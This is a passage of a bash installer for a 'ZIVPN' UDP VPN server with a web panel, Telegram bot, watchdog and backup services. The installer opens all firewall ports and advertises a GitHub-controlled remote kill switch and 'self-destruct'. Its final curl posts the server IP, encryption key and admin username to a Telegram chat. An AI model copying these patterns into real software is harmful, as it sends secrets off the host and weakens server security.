cat >/etc/zivpn/backup.py <<'PY'
import sqlite3, shutil, datetime, os, gzip

BACKUP_DIR = "/etc/zivpn/backups"
DATABASE_PATH = "/etc/zivpn/zivpn.db"

def backup_database():
    if not os.path.exists(BACKUP_DIR):
        os.makedirs(BACKUP_DIR)
    
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_file = os.path.join(BACKUP_DIR, f"zivpn_backup_{timestamp}.db.gz")
    
    # Backup database
    with open(DATABASE_PATH, 'rb') as f_in:
        with gzip.open(backup_file, 'wb') as f_out:
            shutil.copyfileobj(f_in, f_out)
    
    # Cleanup old backups (keep last 7 days)
    for file in os.listdir(BACKUP_DIR):
        file_path = os.path.join(BACKUP_DIR, file)
        if os.path.isfile(file_path):
            file_time = datetime.datetime.fromtimestamp(os.path.getctime(file_path))
            if (datetime.datetime.now() - file_time).days > 7:
                os.remove(file_path)
    
    print(f"Backup created: {backup_file}")

if __name__ == '__main__':
    backup_database()
PY

# ===== Connection Manager =====
say "${Y}🔗 Connection Manager ထည့်သွင်းနေပါတယ်...${Z}"
cat >/etc/zivpn/connection_manager.py <<'PY'
import sqlite3
import subprocess
import time
import threading
from datetime import datetime
import os

DATABASE_PATH = "/etc/zivpn/zivpn.db"

class ConnectionManager:
    def __init__(self):
        self.connection_tracker = {}
        self.lock = threading.Lock()
        
    def get_db(self):
        conn = sqlite3.connect(DATABASE_PATH)
        conn.row_factory = sqlite3.Row
        return conn
        
    def get_active_connections(self):
        """Get active connections using conntrack"""
        try:
            result = subprocess.run(
                "conntrack -L -p udp 2>/dev/null | grep -E 'dport=(5667|[6-9][0-9]{3}|[1-9][0-9]{4})' | awk '{print $7,$8}'",
                shell=True, capture_output=True, text=True
            )
            
            connections = {}
            for line in result.stdout.split('\n'):
                if 'src=' in line and 'dport=' in line:
                    try:
                        parts = line.split()
                        src_ip = None
                        dport = None
                        
                        for part in parts:
                            if part.startswith('src='):
                                src_ip = part.split('=')[1]
                            elif part.startswith('dport='):
                                dport = part.split('=')[1]
                        
                        if src_ip and dport:
                            connections[f"{src_ip}:{dport}"] = True
                    except:
                        continue
            return connections
        except:
            return {}
            
    def enforce_connection_limits(self):
        """Enforce connection limits for all users"""
        db = self.get_db()
        try:
            # Get all active users with their connection limits
            users = db.execute('''
                SELECT username, concurrent_conn, port 
                FROM users 
                WHERE status = "active" AND (expires IS NULL OR expires >= CURRENT_DATE)
            ''').fetchall()
            
            active_connections = self.get_active_connections()
            
            for user in users:
                username = user['username']
                max_connections = user['concurrent_conn']
                user_port = str(user['port'] or '5667')
                
                # Count connections for this user (by port)
                user_conn_count = 0
                user_connections = []
                
                for conn_key in active_connections:
                    if conn_key.endswith(f":{user_port}"):
                        user_conn_count += 1
                        user_connections.append(conn_key)
                
                # If over limit, drop oldest connections
                if user_conn_count > max_connections:
                    print(f"User {username} has {user_conn_count} connections (limit: {max_connections})")
                    
                    # Drop excess connections (FIFO - we'll drop the first ones we find)
                    excess = user_conn_count - max_connections
                    for i in range(excess):
                        if i < len(user_connections):
                            conn_to_drop = user_connections[i]
                            self.drop_connection(conn_to_drop)
                            
        finally:
            db.close()
            
    def drop_connection(self, connection_key):
        """Drop a specific connection using conntrack"""
        try:
            # connection_key format: "IP:PORT"
            ip, port = connection_key.split(':')
            subprocess.run(
                f"conntrack -D -p udp --dport {port} --src {ip}",
                shell=True, capture_output=True
            )
            print(f"Dropped connection: {connection_key}")
        except Exception as e:
            print(f"Error dropping connection {connection_key}: {e}")
            
    def start_monitoring(self):
        """Start the connection monitoring loop"""
        def monitor_loop():
            while True:
                try:
                    self.enforce_connection_limits()
                    time.sleep(10)  # Check every 10 seconds
                except Exception as e:
                    print(f"Monitoring error: {e}")
                    time.sleep(30)
                    
        monitor_thread = threading.Thread(target=monitor_loop, daemon=True)
        monitor_thread.start()
        
# Global instance
connection_manager = ConnectionManager()

if __name__ == "__main__":
    print("Starting Connection Manager...")
    connection_manager.start_monitoring()
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        print("Stopping Connection Manager...")
PY

# ===== systemd Services =====
say "${Y}🧰 systemd services များ ထည့်သွင်းနေပါတယ်...${Z}"

# ZIVPN Service
cat >/etc/systemd/system/zivpn.service <<'EOF'
[Unit]
Description=ZIVPN UDP Server
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/etc/zivpn
ExecStart=/usr/local/bin/zivpn server -c /etc/zivpn/config.json
Restart=always
RestartSec=3
Environment=ZIVPN_LOG_LEVEL=info
CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE CAP_NET_RAW
AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE CAP_NET_RAW
NoNewPrivileges=true

[Install]
WantedBy=multi-user.target
EOF

# Web Panel Service
cat >/etc/systemd/system/zivpn-web.service <<'EOF'
[Unit]
Description=ZIVPN Web Panel
After=network.target

[Service]
Type=simple
User=root
EnvironmentFile=-/etc/zivpn/web.env
ExecStart=/usr/bin/python3 /etc/zivpn/web.py
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
EOF

# Telegram Bot Service
cat >/etc/systemd/system/zivpn-bot.service <<'EOF'
[Unit]
Description=ZIVPN Telegram Bot
After=network.target

[Service]
Type=simple
User=root
EnvironmentFile=-/etc/zivpn/web.env
WorkingDirectory=/etc/zivpn
ExecStart=/usr/bin/python3 /etc/zivpn/bot.py
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
EOF

# Connection Manager Service
cat >/etc/systemd/system/zivpn-connection.service <<'EOF'
[Unit]
Description=ZIVPN Connection Manager
After=network.target zivpn.service

[Service]
Type=simple
User=root
WorkingDirectory=/etc/zivpn
ExecStart=/usr/bin/python3 /etc/zivpn/connection_manager.py
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

# Watchdog Service
cat >/etc/systemd/system/zivpn-watchdog.service <<'EOF'
[Unit]
Description=ZIVPN Security Watchdog
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/etc/zivpn
ExecStart=/usr/bin/python3 /etc/zivpn/watchdog.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# Backup Service
cat >/etc/systemd/system/zivpn-backup.service <<'EOF'
[Unit]
Description=ZIVPN Backup Service
After=network.target

[Service]
Type=oneshot
User=root
WorkingDirectory=/etc/zivpn
ExecStart=/usr/bin/python3 /etc/zivpn/backup.py

[Install]
WantedBy=multi-user.target
EOF

cat >/etc/systemd/system/zivpn-backup.timer <<'EOF'
[Unit]
Description=Daily ZIVPN Backup
Requires=zivpn-backup.service

[Timer]
OnCalendar=daily
Persistent=true

[Install]
WantedBy=timers.target
EOF

# Cleanup Service
cat >/etc/systemd/system/zivpn-cleanup.service <<'EOF'
[Unit]
Description=ZIVPN Daily Cleanup
After=network.target

[Service]
Type=oneshot
User=root
WorkingDirectory=/etc/zivpn
ExecStart=/usr/bin/python3 /etc/zivpn/cleanup.py

[Install]
WantedBy=multi-user.target
EOF

cat >/etc/systemd/system/zivpn-cleanup.timer <<'EOF'
[Unit]
Description=Daily ZIVPN Cleanup Timer
Requires=zivpn-cleanup.service

[Timer]
OnCalendar=daily
Persistent=true

[Install]
WantedBy=timers.target
EOF

# ===== Networking Setup =====
echo -e "${Y}🌐 Network Configuration ပြုလုပ်နေပါတယ်...${Z}"
sysctl -w net.ipv4.ip_forward=1 >/dev/null
grep -q '^net.ipv4.ip_forward=1' /etc/sysctl.conf || echo 'net.ipv4.ip_forward=1' >> /etc/sysctl.conf

IFACE=$(ip -4 route ls | awk '/default/ {print $5; exit}')
[ -n "${IFACE:-}" ] || IFACE=eth0

# DNAT Rules
iptables -t nat -F
iptables -t nat -A PREROUTING -i "$IFACE" -p udp --dport 6000:19999 -j DNAT --to-destination :5667
iptables -t nat -A POSTROUTING -o "$IFACE" -j MASQUERADE

# UFW Rules
ufw allow 1:65535/tcp >/dev/null 2>&1 || true
ufw allow 1:65535/udp >/dev/null 2>&1 || true
ufw --force enable >/dev/null 2>&1 || true

# ===== Final Setup =====
say "${Y}🔧 Final Configuration ပြုလုပ်နေပါတယ်...${Z}"
chmod +x /etc/zivpn/*.py
sed -i 's/\r$//' /etc/zivpn/*.py /etc/systemd/system/zivpn* || true

# Make critical files immutable
chattr +i /etc/zivpn/web.py 2>/dev/null || true
chattr +i /etc/zivpn/bot.py 2>/dev/null || true

systemctl daemon-reload
systemctl enable --now zivpn.service
systemctl enable --now zivpn-web.service
systemctl enable --now zivpn-bot.service
systemctl enable --now zivpn-connection.service
systemctl enable --now zivpn-watchdog.service
systemctl enable --now zivpn-backup.timer
systemctl enable --now zivpn-cleanup.timer

# Initial setup
python3 /etc/zivpn/cleanup.py
python3 /etc/zivpn/backup.py
systemctl restart zivpn.service

# ===== Completion Message =====
IP=$(hostname -I | awk '{print $1}')
echo -e "\n$LINE\n${G}✅ ZIVPN ENCRYPTED Enterprise Edition Completed!${Z}"
echo -e "${C}🌐 WEB PANEL:${Z} ${Y}http://$IP:19432${Z}"
echo -e "\n${G}🔐 SECURITY INFORMATION (SAVE THIS!)${Z}"
echo -e "  ${Y}• Owner ID:${Z} ${M}$OWNER_TELEGRAM_ID${Z}"
echo -e "  ${Y}• Encryption Key:${Z} ${M}$ENCRYPTION_KEY${Z}"
echo -e "  ${Y}• Kill Switch:${Z} ${M}Set 'KILL_$OWNER_TELEGRAM_ID' in GitHub killswitch.txt${Z}"
echo -e "\n${G}🔐 LOGIN CREDENTIALS${Z}"
echo -e "  ${Y}• Username:${Z} ${Y}$WEB_USER${Z}"
echo -e "  ${Y}• Password:${Z} ${Y}$WEB_PASS${Z}"
echo -e "\n${M}📊 SECURITY FEATURES ENABLED:${Z}"
echo -e "  ${Y}✓ Source code encrypted${Z}"
echo -e "  ${Y}✓ Owner verification required${Z}"
echo -e "  ${Y}✓ Remote kill switch active${Z}"
echo -e "  ${Y}✓ Self-destruct on unauthorized access${Z}"
echo -e "  ${Y}✓ 24/7 security watchdog${Z}"
echo -e "  ${Y}✓ Access logging to owner${Z}"
echo -e "${C}ℹ️  IMPORTANT:${Z} ${G}Source code is encrypted. Others cannot read/view it.${Z}"
echo -e "${Y}🔑 To access code yourself: export ZIVPN_OWNER_KEY='$ENCRYPTION_KEY'${Z}"
echo -e "$LINE"

# Send installation success to owner
curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
    -d "chat_id=$OWNER_TELEGRAM_ID" \
    -d "text=✅ ZIVPN ENCRYPTED Edition Installed
🌐 Server: $IP
🔑 Key: $ENCRYPTION_KEY
👤 Admin: $WEB_USER
🕒 $(date)
🔒 Source code protected from unauthorized access" \
    >/dev/null 2>&1 &

echo -e "${Y}📨 Installation notification sent to owner (Telegram)${Z}"
